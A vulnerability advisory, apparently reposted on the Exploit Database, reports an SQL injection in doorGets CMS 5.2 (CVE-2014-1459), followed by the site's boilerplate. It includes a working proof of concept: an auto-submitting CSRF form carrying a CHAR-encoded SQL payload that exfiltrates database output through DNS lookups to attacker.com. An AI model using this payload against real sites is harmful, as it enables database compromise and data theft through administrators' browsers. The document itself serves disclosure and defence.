```
Advisory ID: HTB23197
Product: doorGets CMS
Vendor: doorGets
Vulnerable Version(s): 5.2 and probably prior
Tested Version: 5.2
Advisory Publication:  January 15, 2014  [without technical details]
Vendor Notification: January 15, 2014
Vendor Patch: January 15, 2014
Public Disclosure: February 5, 2014
Vulnerability Type: SQL Injection [CWE-89]
CVE Reference: CVE-2014-1459
Risk Level: Medium
CVSSv2 Base Score: 5.1 (AV:N/AC:H/Au:N/C:P/I:P/A:P)
Solution Status: Fixed by Vendor
Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ )

-----------------------------------------------------------------------------------------------

Advisory Details:

High-Tech Bridge Security Research Lab discovered vulnerability in doorGets CMS, which can be exploited to perform SQL Injection attacks.

1) SQL Injection in doorGets CMS: CVE-2014-1459

The vulnerability exists due to insufficient validation of "_position_down_id" HTTP POST parameter passed to "/dg-admin/index.php" script. A remote attacker with access to administrative interface can execute arbitrary SQL commands in application's database. This vulnerability however can be exploited by a remote unauthenticated user via CSRF vector.

The following exploitation example is based on DNS Exfiltration technique and may be used if the database of the vulnerable application is hosted on a Windows system. The PoC will use a CSRF vector to send a DNS request demanding IP addess for `version()` (or any other sensetive output from the database) subdomain of ".attacker.com" (a domain name, DNS server of which is controlled by the attacker):

<form action="http://[host]/dg-admin/?controller=rubriques" method="post" name="main">
<input type="hidden" name="_position_down_id" value="1 AND 1=(select load_file(CONCAT(CHAR(92),CHAR(92),(select version()),CHAR(46),CHAR(97),CHAR(116),CHAR(116),CHAR(97),CHAR(99),CHAR(107),CHAR(101),CHAR(114),CHAR(46),CHAR(99),CHAR(111),CHAR(109),CHAR(92),CHAR(102),CHAR(111),CHAR(111),CHAR(98),CHAR(97),CHAR(114)))) -- ">
<input type="hidden" name="_position_down_position" value="1">
<input type="hidden" name="_position_down_submit" value="1">
<input type="hidden" name="_position_down_type" value="down">
<input type="submit" id="btn">
</form>
<script>
document.getElementById('btn').click();
</script>

-----------------------------------------------------------------------------------------------

Solution:

Fixed by vendor on January 15, 2014 directly in the source code without version modification/new release. Update to the version 5.2 released after January 15, 2014.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
